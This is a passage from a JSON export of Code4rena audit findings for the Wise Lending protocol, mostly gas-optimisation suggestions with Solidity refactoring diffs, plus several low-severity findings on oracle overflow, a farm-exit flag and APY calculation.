100644\n--- a/contracts/WiseOracleHub/OracleHelper.sol\n+++ b/contracts/WiseOracleHub/OracleHelper.sol\n@@ -135,13 +135,10 @@ abstract contract OracleHelper is Declarations {\n         view\n         returns (uint256)\n     {\n-        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[\n-            _tokenAddress\n-        ];\n\n         uint256 fetchTwapValue;\n\n-        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {\n+        if (uniTwapPoolInfo[_tokenAddress].oracle > ZERO_ADDRESS) {\n             fetchTwapValue = latestResolverTwap(\n                 _tokenAddress\n             );\n```\n\nEstimated gas saved: 2100 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32117",
      "title": "[G-03] Refactor the following function to reduce number of `SLOAD`",
      "impact": "GAS",
      "content": "\n**Instance 1:**\n\nRefactor the `WiseLending._healthStateCheck()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-#L90\n\nWe can make the `WiseLending._healthStateCheck()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `powerFarmCheck` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored.\n\n```solidity\nfile: contracts/WiseLending.sol\n\n77:    function _healthStateCheck(\n78:        uint256 _nftId\n79:    )\n80:        private\n81:    {\n82:        _checkHealthState(\n83:            _nftId,\n84:            powerFarmCheck   //@audit 1st powerFarmCheck SLOAD\n85:        );\n86:\n87:        if (powerFarmCheck == true) {       //@audit 2nd powerFarmCheck SLOAD\n88:            powerFarmCheck = false;\n89:        }\n90:    }\n```\n\n```diff\ndiff --git a/contracts/WiseLending.sol b/contracts/WiseLending.sol\nindex 045678d..a35c653 100644\n--- a/contracts/WiseLending.sol\n+++ b/contracts/WiseLending.sol\n@@ -79,12 +79,13 @@ contract WiseLending is PoolManager {\n     )\n         private\n     {\n+        bool _powerFarmCheck = powerFarmCheck;\n         _checkHealthState(\n             _nftId,\n-            powerFarmCheck\n+            _powerFarmCheck\n         );\n\n-        if (powerFarmCheck == true) {\n+        if (_powerFarmCheck == true) {\n             powerFarmCheck = false;\n         }\n     }\n```\n\nEstimated gas saved: 97 gas units.\n\n**Instance 2:**\n\nRefactor the `PendlePowerFarmToken.addCompoundRewards()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L502-#L524\n\nWe can make the `PendlePowerFarmToken.addCompoundRewards()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `PENDLE_POWER_FARM_CONTROLLER` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n502:    function addCompoundRewards(\n503:        uint256 _amount\n504:    )\n505:        external\n506:        syncSupply\n507:    {\n508:        if (_amount == 0) {\n509:            revert ZeroAmount();\n510:        }\n511:\n512:        totalLpAssetsToDistribute += _amount;\n513:\n514:        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {   // @audit 1st PENDLE_POWER_FARM_CONTROLLER SLOAD\n515:            return;\n516:        }\n517:\n518:        _safeTransferFrom(\n519:            UNDERLYING_PENDLE_MARKET,\n520:            msg.sender,\n521:            PENDLE_POWER_FARM_CONTROLLER,      // @audit 1st PENDLE_POWER_FARM_CONTROLLER SLOAD\n522:            _amount\n523:        );\n524:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..2f13a79 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -510,15 +510,15 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n         }\n\n         totalLpAssetsToDistribute += _amount;\n-\n-        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n+        address _PENDLE_POWER_FARM_CONTROLLER = PENDLE_POWER_FARM_CONTROLLER;\n+        if (msg.sender == _PENDLE_POWER_FARM_CONTROLLER) {\n             return;\n         }\n\n         _safeTransferFrom(\n             UNDERLYING_PENDLE_MARKET,\n             msg.sender,\n-            PENDLE_POWER_FARM_CONTROLLER,\n+            _PENDLE_POWER_FARM_CONTROLLER,\n             _amount\n         );\n     }\n```\n\nEstimated gas saved: 97 gas units.\n\n**Instance 3:**\n\nRefactor the `PendlePowerFarmToken.withdrawExactShares()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L608-#L645\n\nWe can make the `PendlePowerFarmToken.withdrawExactShares()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `underlyingLpAssetsCurrent` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n608:    function withdrawExactShares(\n609:        uint256 _shares\n610:    )\n611:        external\n612:        syncSupply\n613:        returns (uint256)\n614:    {\n615:        if (_shares == 0) {\n616:            revert ZeroAmount();\n617:        }\n618:\n619:        if (_shares > balanceOf(msg.sender)) {\n620:            revert InsufficientShares();\n621:        }\n622:\n623:        uint256 tokenAmount = previewAmountWithdrawShares(\n624:            _shares,\n625:            underlyingLpAssetsCurrent   // @audit underlyingLpAssetsCurrent 1st SLOAD\n626:        );\n627:\n628:        underlyingLpAssetsCurrent -= tokenAmount;   // @audit underlyingLpAssetsCurrent 2nd SLOAD\n629:\n630:        _burn(\n631:            msg.sender,\n632:            _shares\n633:        );\n634:\n635:        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n636:            return tokenAmount;\n637:        }\n638:\n639:        _withdrawLp(\n640:            msg.sender,\n641:            tokenAmount\n642:        );\n643:\n644:        return tokenAmount;\n645:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..436d8be 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -620,12 +620,14 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n             revert InsufficientShares();\n         }\n\n+        uint256 _underlyingLpAssetsCurrent = underlyingLpAssetsCurrent;\n+\n         uint256 tokenAmount = previewAmountWithdrawShares(\n             _shares,\n-            underlyingLpAssetsCurrent\n+            _underlyingLpAssetsCurrent\n         );\n\n-        underlyingLpAssetsCurrent -= tokenAmount;\n+        underlyingLpAssetsCurrent = _underlyingLpAssetsCurrent - tokenAmount;\n\n         _burn(\n             msg.sender,\n```\n\nEstimated gas saved: 97 gas units.\n\n**Instance 4:**\n\nRefactor the `PendlePowerFarmToken.withdrawExactAmount()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L647-#L680\n\nWe can make the `PendlePowerFarmToken.withdrawExactAmount()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `underlyingLpAssetsCurrent` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n647:    function withdrawExactAmount(\n648:        uint256 _underlyingLpAssetAmount\n649:    )\n650:        external\n651:        syncSupply\n652:        returns (uint256)\n653:    {\n654:        if (_underlyingLpAssetAmount == 0) {\n655:            revert ZeroAmount();\n656:        }\n657:\n658:        uint256 shares = previewBurnShares(\n659:            _underlyingLpAssetAmount,\n660:            underlyingLpAssetsCurrent   // @audit underlyingLpAssetsCurrent 1st SLOAD\n661:        );\n662:\n663:        if (shares > balanceOf(msg.sender)) {\n664:            revert NotEnoughShares();\n665:        }\n666:\n667:        _burn(\n668:            msg.sender,\n669:            shares\n670:        );\n671:\n672:        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount; // @audit underlyingLpAssetsCurrent 2nd SLOAD\n673:\n674:        _withdrawLp(\n675:            msg.sender,\n676:            _underlyingLpAssetAmount\n677:        );\n678:\n679:        return shares;\n680:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..5912c50 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -655,9 +655,10 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n             revert ZeroAmount();\n         }\n\n+        uint256 _underlyingLpAssetsCurrent = underlyingLpAssetsCurrent;\n         uint256 shares = previewBurnShares(\n             _underlyingLpAssetAmount,\n-            underlyingLpAssetsCurrent\n+            _underlyingLpAssetsCurrent\n         );\n\n         if (shares > balanceOf(msg.sender)) {\n@@ -669,7 +670,7 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n             shares\n         );\n\n-        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;\n+        underlyingLpAssetsCurrent = _underlyingLpAssetsCurrent - _underlyingLpAssetAmount;\n\n         _withdrawLp(\n             msg.sender,\n```\n\nEstimated gas saved: 97 gas units.\n\n**Instance 5:**\n\nRefactor the `FeeManager.claimOwnershipIncentiveMaster()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L194-#L208\n\nWe can make the `FeeManager.claimOwnershipIncentiveMaster()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `proposedIncentiveMaster` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable also the `proposedIncentiveMaster` was assigned to `incentiveMaster` which is also used in the event `ClaimedOwnershipIncentiveMaster` rather than using `incentiveMaster` in the event we should use the cached stack variable. Implementing this would avoid 2 `SLOAD`(warmaccess) `200` gas units and replace it with cheaper stack reads. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n194:    function claimOwnershipIncentiveMaster()\n195:        external\n196:    {\n197:        if (msg.sender != proposedIncentiveMaster) { // @audit proposedIncentiveMaster 1st SLOAD\n198:            revert NotAllowed();\n199:        }\n200:\n201:        incentiveMaster = proposedIncentiveMaster; // @audit proposedIncentiveMaster 2nd SLOAD\n202:        proposedIncentiveMaster = ZERO_ADDRESS;\n203:\n204:        emit ClaimedOwnershipIncentiveMaster(\n205:            incentiveMaster,\n206:            block.timestamp\n207:        );\n208:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol\nindex f176113..1ef0ae7 100644\n--- a/contracts/FeeManager/FeeManager.sol\n+++ b/contracts/FeeManager/FeeManager.sol\n@@ -194,15 +194,16 @@ contract FeeManager is FeeManagerHelper {\n     function claimOwnershipIncentiveMaster()\n         external\n     {\n-        if (msg.sender != proposedIncentiveMaster) {\n+        address _proposedIncentiveMaster = proposedIncentiveMaster;\n+        if (msg.sender != _proposedIncentiveMaster) {\n             revert NotAllowed();\n         }\n\n-        incentiveMaster = proposedIncentiveMaster;\n+        incentiveMaster = _proposedIncentiveMaster;\n         proposedIncentiveMaster = ZERO_ADDRESS;\n\n         emit ClaimedOwnershipIncentiveMaster(\n-            incentiveMaster,\n+            _proposedIncentiveMaster,\n             block.timestamp\n         );\n     }\n```\n\nEstimated gas saved: 194 gas units.\n\n**Instance 6:**\n\nRefactor the `WiseOracleHub.getTokensFromUSD()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L171-#L192\n\nWe can make the `WiseOracleHub.getTokensFromUSD()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `_decimalsETH` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/WiseOracleHub/WiseOracleHub.sol\n\n171:    function getTokensFromUSD(\n172:        address _tokenAddress,\n173:        uint256 _usdValue\n174:    )\n175:        external\n176:        view\n177:        returns (uint256)\n178:    {\n179:        uint8 tokenDecimals = _tokenDecimals[\n180:            _tokenAddress\n181:        ];\n182:\n183:        return _decimalsETH < tokenDecimals  // @audit _decimalsETH 1st SLOAD\n184:            ? _usdValue\n185:                * 10 ** (tokenDecimals - _decimalsETH)    // @audit _decimalsETH 2nd SLOAD\n186:                * 10 ** decimals(_tokenAddress)\n187:                / latestResolver(_tokenAddress)\n188:            : _usdValue\n189:                * 10 ** decimals(_tokenAddress)\n190:                / latestResolver(_tokenAddress)\n191:                / 10 ** (_decimalsETH - tokenDecimals);  // @audit _decimalsETH 2nd SLOAD\n192:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol\nindex 12fe0c8..8d08417 100644\n--- a/contracts/WiseOracleHub/WiseOracleHub.sol\n+++ b/contracts/WiseOracleHub/WiseOracleHub.sol\n@@ -179,16 +179,16 @@ contract WiseOracleHub is OracleHelper {\n         uint8 tokenDecimals = _tokenDecimals[\n             _tokenAddress\n         ];\n-\n-        return _decimalsETH < tokenDecimals\n+        uint8 decimalsEth = _decimalsETH;\n+        return decimalsEth < tokenDecimals\n             ? _usdValue\n-                * 10 ** (tokenDecimals - _decimalsETH)\n+                * 10 ** (tokenDecimals - decimalsEth)\n                 * 10 ** decimals(_tokenAddress)\n                 / latestResolver(_tokenAddress)\n             : _usdValue\n                 * 10 ** decimals(_tokenAddress)\n                 / latestResolver(_tokenAddress)\n-                / 10 ** (_decimalsETH - tokenDecimals);\n+                / 10 ** (decimalsEth - tokenDecimals);\n     }\n\n     /**\n```\n\nEstimated gas saved: 97 gas units.\n\n**Instance 7:**\n\nRefactor the `WiseOracleHub.getTokensFromETH()` function such that the number of storage reads is reduced.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L327-#L352\n\nWe can make the `WiseOracleHub.getTokensFromETH()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `_decimalsETH` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:\n\n```solidity\nfile: contracts/WiseOracleHub/WiseOracleHub.sol\n\n327:    function getTokensFromETH(\n328:        address _tokenAddress,\n329:        uint256 _ethAmount\n330:    )\n331:        public\n332:        view\n333:        returns (uint256)\n334:    {\n335:        if (_tokenAddress == WETH_ADDRESS) {\n336:            return _ethAmount;\n337:        }\n338:\n339:        uint8 tokenDecimals = _tokenDecimals[\n340:            _tokenAddress\n341:        ];\n342:\n343:        return _decimalsETH < tokenDecimals       // @audit _decimalsETH 1st SLOAD\n344:            ? _ethAmount\n345:                * 10 ** (tokenDecimals - _decimalsETH)        // @audit _decimalsETH 2nd SLOAD\n346:                * 10 ** decimals(_tokenAddress)\n347:                / latestResolver(_tokenAddress)\n348:            : _ethAmount\n349:                * 10 ** decimals(_tokenAddress)\n350:                / latestResolver(_tokenAddress)\n351:                / 10 ** (_decimalsETH - tokenDecimals);   // @audit _decimalsETH 3rd SLOAD\n352:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol\nindex 12fe0c8..78004fe 100644\n--- a/contracts/WiseOracleHub/WiseOracleHub.sol\n+++ b/contracts/WiseOracleHub/WiseOracleHub.sol\n@@ -339,16 +339,16 @@ contract WiseOracleHub is OracleHelper {\n         uint8 tokenDecimals = _tokenDecimals[\n             _tokenAddress\n         ];\n-\n-        return _decimalsETH < tokenDecimals\n+        uint8 decimalsEth = _decimalsETH;\n+        return decimalsEth < tokenDecimals\n             ? _ethAmount\n-                * 10 ** (tokenDecimals - _decimalsETH)\n+                * 10 ** (tokenDecimals - decimalsEth)\n                 * 10 ** decimals(_tokenAddress)\n                 / latestResolver(_tokenAddress)\n             : _ethAmount\n                 * 10 ** decimals(_tokenAddress)\n                 / latestResolver(_tokenAddress)\n-                / 10 ** (_decimalsETH - tokenDecimals);\n+                / 10 ** (decimalsEth - tokenDecimals);\n     }\n\n     /**\n```\n\nEstimated gas saved: 97 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32116",
      "title": "[G-02] Avoid Reading and writing to state if the value is zero",
      "impact": "GAS",
      "content": "\n**Instance 1:**\n\nRefactor `FeeManager.increaseIncentiveA()` to avoid reading or writing to state if `_value` is `0`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L220\n\nIn the `FeeManager.increaseIncentiveA()` function as shown below checks should be implemented to avoid reading and writing to state if the `_value` argument is zero this is because in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerA] += _value` would not in any way change the value of `incentiveUSD[incentiveOwnerA]` since it is being incremented by `0`. This means that in scenarios where `_value_` is `0` the statement `incentiveUSD[incentiveOwnerA] += _value` is re-assigning the same value to state; i.e. there is no state change.\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n214:    function increaseIncentiveA(\n215:        uint256 _value\n216:    )\n217:        external\n218:        onlyIncentiveMaster\n219:    {\n220:        incentiveUSD[incentiveOwnerA] += _value;   // @audit implement zero checks\n221:\n222:        emit IncentiveIncreasedA(\n223:            _value,\n224:            block.timestamp\n225:        );\n226:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol\nindex f176113..4515083 100644\n--- a/contracts/FeeManager/FeeManager.sol\n+++ b/contracts/FeeManager/FeeManager.sol\n@@ -24,6 +24,7 @@ import \"./FeeManagerHelper.sol\";\n\n contract FeeManager is FeeManagerHelper {\n\n+    error ZeroValue();\n     constructor(\n         address _master,\n         address _aaveAddress,\n@@ -217,6 +218,9 @@ contract FeeManager is FeeManagerHelper {\n         external\n         onlyIncentiveMaster\n     {\n+        if(_value == 0) {\n+            revert ZeroValue();\n+        }\n         incentiveUSD[incentiveOwnerA] += _value;\n```\n\nEstimated gas saved: 50000 gas units.\n\n**Instance 2:**\n\nRefactor `FeeManager.increaseIncentiveB()` to avoid reading or writing to state if `_value` is `0`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L238\n\nIn the `FeeManager.increaseIncentiveB()` function as shown below checks should be implemented to avoid reading and writing to state if the `_value` argument is zero this is because in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerB] += _value` would not in any way change the value of `incentiveUSD[incentiveOwnerB]` since it is being incremented by `0`. This means that in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerB] += _value` is re-assigning the same value to state; i.e. there is no state change.\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n232:    function increaseIncentiveB(\n233:        uint256 _value\n234:    )\n235:        external\n236:        onlyIncentiveMaster\n237:    {\n238:        incentiveUSD[incentiveOwnerB] += _value;   // @audit implement zero checks\n239:\n240:        emit IncentiveIncreasedB(\n241:            _value,\n242:            block.timestamp\n243:        );\n244:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol\nindex f176113..79f4dc6 100644\n--- a/contracts/FeeManager/FeeManager.sol\n+++ b/contracts/FeeManager/FeeManager.sol\n@@ -24,6 +24,7 @@ import \"./FeeManagerHelper.sol\";\n\n contract FeeManager is FeeManagerHelper {\n\n+    error ZeroValue();\n     constructor(\n         address _master,\n         address _aaveAddress,\n@@ -234,7 +235,10 @@ contract FeeManager is FeeManagerHelper {\n     )\n         external\n         onlyIncentiveMaster\n-    {\n+    {\n+        if(_value == 0) {\n+            revert ZeroValue();\n+        }\n         incentiveUSD[incentiveOwnerB] += _value;\n\n         emit IncentiveIncreasedB(\n```\n\nEstimated gas saved: 5000 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32115",
      "title": "[G-01] Refactor `PendlePowerFarmController.increaseReservedForCompound()` function to avoid unnecessary copying from storage to memory and vice-versa",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L497-#L524\n\nThe `PendlePowerFarmController.increaseReservedForCompound()` function can be refactored to be better gas efficient by avoiding unnecessary copying of values from storage to memory updating the values then copying back to storage. Having to copy from the storage variable `pendleChildCompoundInfo[_pendleMarket]` into a memory variable `childInfo` would mean that every storage slot of `pendleChildCompoundInfo[_pendleMarket]` would be read (even those not needed in the function); which would cost 2100 gas units for every slot read. Then, it has to update the memory variable in the while loop before copying the memory variable into the storage is absolutely gas inefficient.\n\nWe can rectify this by making the `childInfo` variable a storage variable, doing this would avoid having copy values from storage to memory since the it is passed by reference also there would be absolutely no need to copy from memory back to storage. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n\n497:    function increaseReservedForCompound(\n498:        address _pendleMarket,\n499:        uint256[] calldata _amounts\n500:    )\n501:        external\n502:        onlyChildContract(_pendleMarket)\n503:    {\n504:        CompoundStruct memory childInfo = pendleChildCompoundInfo[\n505:            _pendleMarket\n506:        ];\n507:\n508:        uint256 i;\n509:        uint256 length = childInfo.rewardTokens.length;\n510:\n511:        while (i < length) {\n512:            childInfo.reservedForCompound[i] += _amounts[i];\n513:            unchecked {\n514:                ++i;\n515:            }\n516:        }\n517:\n518:        pendleChildCompoundInfo[_pendleMarket] = childInfo;\n519:\n520:        emit IncreaseReservedForCompound(\n521:            _pendleMarket,\n522:            _amounts\n523:        );\n524:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.solindex 15cb863..842b94e 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n@@ -501,7 +501,7 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {\n         external\n         onlyChildContract(_pendleMarket)\n     {\n-        CompoundStruct memory childInfo = pendleChildCompoundInfo[\n+        CompoundStruct storage childInfo = pendleChildCompoundInfo[\n             _pendleMarket\n         ];\n\n@@ -515,8 +515,6 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {\n             }\n         }\n\n-        pendleChildCompoundInfo[_pendleMarket] = childInfo;\n-\n         emit IncreaseReservedForCompound(\n             _pendleMarket,\n             _amounts\n```\n\nEstimated gas saved: 13672 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32114",
      "title": "[08] `exitFarm` doesn´t default the `isAave` flag",
      "impact": "LOW",
      "content": "\nWhen the  `exitFarm` is called:\n\n1. The Power Farm NFT is burned,\n2. Reserved keys are reset,\n3. And available NFT mapping is reserved for the burned one.\n\nHowever, it doesn't revert the `isAave` mapping to false:\n\n```solidity\nContract: PendlePowerManager.sol\n\n210:     function exitFarm(\n211:         uint256 _keyId,\n212:         uint256 _allowedSpread,\n213:         bool _ethBack \n214:     )\n215:         external\n216:         updatePools\n217:         onlyKeyOwner(_keyId)\n218:     {\n219:         uint256 wiseLendingNFT = farmingKeys[\n220:             _keyId\n221:         ];\n222: \n223:         delete farmingKeys[\n224:             _keyId\n225:         ];\n226: \n227:         if (reservedKeys[msg.sender] == _keyId) {\n228:             reservedKeys[msg.sender] = 0;\n229:         } else {\n230:             FARMS_NFTS.burnKey(\n231:                 _keyId\n232:             );\n233:         }\n234: \n235:         availableNFTs[\n236:             ++availableNFTCount\n237:         ] = wiseLendingNFT;\n238: \n239:         _closingPosition(\n240:             isAave[_keyId],//@audit if this remains as True, it will remain true\n241:             wiseLendingNFT,\n242:             _allowedSpread,\n243:             _ethBack\n244:         );\n245: \n246:         emit FarmExit(\n247:             _keyId,\n248:             wiseLendingNFT,\n249:             _allowedSpread,\n250:             block.timestamp\n251:         );\n252:     }\n```\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/230#issuecomment-2022408387):**\n > [02] - not necessarily valid, it depends on sponsor's interpretation of slippage value.<br>\n> [04] - NC severity.<br>\n> [05] - belongs to analysis report because it is a centralization risk.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32113",
      "title": "[07] Possible DoSing of Pendle farm via overflow",
      "impact": "LOW",
      "content": "\nThere are 3 multiplications of big numbers before first division in `PendleChildLpOracle`:\n\n```javascript\nfunction latestAnswer()\n        public\n        view\n        returns (uint256)\n    {\n        return priceFeedPendleLpOracle.latestAnswer()\n            * pendleChildToken.totalLpAssets()\n            * PRECISION_FACTOR_E18\n            / pendleChildToken.totalSupply()\n            / PRECISION_FACTOR_E18;\n    }\n```\n\nWhen I put some numbers, we still have a space to grow:\n\n```\n> 2**256 / (1e18*1000000e18*1e18)\n115792089237316180\n```\n\nBut either way, the protocol still can use `MathLib.MulDiv` that handles intermediate overflow gracefully in case of black swan events.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32112",
      "title": "[06] Borrow APY calculations don't account for utilization rate",
      "impact": "LOW",
      "content": "\nThere are 2 functions calculating APY: one calculates borrow APY, one lending APY. So, generally both should yield similar results, that is `lending APY - protocol fees ~= borrowing APY`. However, lending APY includes utilization rate of the pool and APY is adjusted over it, while borrowing APY doesn't account for it, leading to borrowing APY assuming utilization rate is always 100%.\n\n```javascript\n    function overallLendingAPY(\n        uint256 _nftId\n    )\n        external\n        view\n        returns (uint256)\n    {\n            weightedRate += ethValue\n                * getLendingRate(token);\n\n            overallETH += ethValue;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return weightedRate\n            / overallETH;\n```\n\nand `lendingRate()` function: \n\n```javascript\ngetLendingRate(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 pseudoTotalPool = WISE_LENDING.getPseudoTotalPool(\n            _poolToken\n        );\n\n        if (pseudoTotalPool == 0) {\n            return 0;\n        }\n\n        uint256 adjustedRate = getBorrowRate(_poolToken)\n            * (PRECISION_FACTOR_E18 - WISE_LENDING.globalPoolData(_poolToken).poolFee)\n            / PRECISION_FACTOR_E18;\n\n        return adjustedRate // @audit pool utilization rate is taken into account\n            * WISE_LENDING.getPseudoTotalBorrowAmount(_poolToken)\n            / pseudoTotalPool;\n    }\n```\n\nIn comparison, borrow APY is calculated as follows:\n\n```javascript\n    function overallBorrowAPY(\n        uint256 _nftId\n    )\n        external\n        view\n        returns (uint256)\n    {\n        // [...]\n\n            weightedRate += ethValue\n                * getBorrowRate(token); // @audit borrow rate is WISE_LENDING.borrowPoolData(_poolToken).borrowRate storage variable\n\n            overallETH += ethValue;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return weightedRate\n            